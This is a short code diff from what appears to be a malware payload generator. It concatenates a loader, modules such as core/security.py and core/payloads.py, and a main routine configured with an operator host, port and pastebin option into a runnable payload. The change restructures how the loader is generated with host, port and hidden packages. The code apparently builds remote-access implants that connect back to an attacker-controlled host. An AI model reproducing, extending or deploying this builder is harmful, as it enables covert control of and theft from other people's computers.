@@ -200,7 +200,7 @@ def _modules(options, **kwargs):
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
-    modules = ['core/loader.py','core/util.py','core/security.py','core/payloads.py']
+    modules = ['core/util.py','core/security.py','core/payloads.py']
 
     if len(options.modules):
         for m in options.modules:
@@ -277,7 +277,10 @@ def _payload(options, **kwargs):
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
 
-    payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
+    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=options.port, packages=list(kwargs['hidden']))))
+    modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
+    payload = '\n'.join((loader, modules))
+
     if not os.path.isdir('modules/payloads'):
         try:
             os.mkdir('modules/payloads')
